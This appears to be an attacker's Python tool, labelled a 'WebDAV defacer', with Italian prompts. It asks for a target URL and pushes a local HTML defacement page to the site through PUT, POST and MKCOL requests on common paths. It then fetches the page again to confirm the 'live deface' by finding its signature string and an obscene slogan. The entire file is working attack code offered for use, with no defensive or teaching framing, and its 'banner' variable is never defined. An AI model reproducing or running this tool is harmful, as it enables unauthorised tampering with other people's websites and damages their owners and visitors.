#!/usr/bin/env python3
# 🔥 TRUSTEDF57 WEBDAV DEFACER - SINGLE TARGET EDITION


import os
import sys
import time
import random
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

red    = "\033[31m"
blue   = "\033[34m"
bold   = "\033[1m"
reset  = "\033[0m"
green  = "\033[32m"
yellow = "\033[33m"


HTML_FILE = "TRUSTEDF57.html"

def eagle(tetew):
    ipt = input(tetew)
    return str(ipt)

def test_deface(target):
    """Multi-method WebDAV + Verify"""
    global success_count
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # METODI + ENDPOINTS
    methods = ['PUT', 'POST', 'MKCOL']
    endpoints = ['/', '/index.html', '/default.aspx', '/webdav/', '/test.html']
    
    html_content = open(HTML_FILE, 'r', encoding='utf-8').read()
    
    for method in methods:
        for endpoint in endpoints:
            url = target.rstrip('/') + endpoint
            
            try:
                resp = session.request(method, url, 
                                     data=html_content, 
                                     timeout=8,
                                     allow_redirects=False)
                
                # SUCCESS CHECK
                if 200 <= resp.status_code < 300:
                    # VERIFY UPLOAD
                    verify = session.get(url, timeout=5)
                    if "TRUSTEDF57" in verify.text or "FUCK OFF MARTHA" in verify.text:
                        success_count += 1
                        print(f"{green}[✅ LIVE DEFACE] {bold}{url}{reset}")
                        return True
                
                # AUTH DETECT
                if resp.status_code == 401:
                    print(f"{yellow}[🔐 AUTH REQ] {url}{reset}")
                    continue
                    
            except:
                continue
    
    print(f"{red}[❌ FAILED] {target}{reset}")
    return False

success_count = 0

def main():
    global success_count
    os.system("clear")
    print(banner)
    
    # CHECK HTML FILE
    if not os.path.exists(HTML_FILE):
        print(f"{red}[❌] {HTML_FILE} NON TROVATO!{reset}")
        sys.exit(1)
    
    print(f"{green}[✓] {HTML_FILE} CARICATO ({os.path.getsize(HTML_FILE)/1024:.1f}KB){reset}")
    
    while True:
        try:
            target = eagle(f"{green}[+] INSERISCI TARGET URL > {reset}")
            if not target.strip():
                continue
                
            print(f"{blue}[*] TESTING {target}...{reset}")
            
            # SINGLE TARGET EXECUTE
            with ThreadPoolExecutor(max_workers=20) as executor:
                executor.submit(test_deface, target)
            
            print(f"\n{green}[📊] SUCCESS: {success_count} | TARGET: {target}{reset}")
            print(f"{yellow}[i] Premi ENTER per nuovo target o CTRL+C{reset}")
            input()
            success_count = 0  # Reset per nuovo target
            
        except KeyboardInterrupt:
            print(f"\n{red}[👋] EXIT - {success_count} SUCCESS{reset}")
            sys.exit(0)

if __name__ == "__main__":
    main()
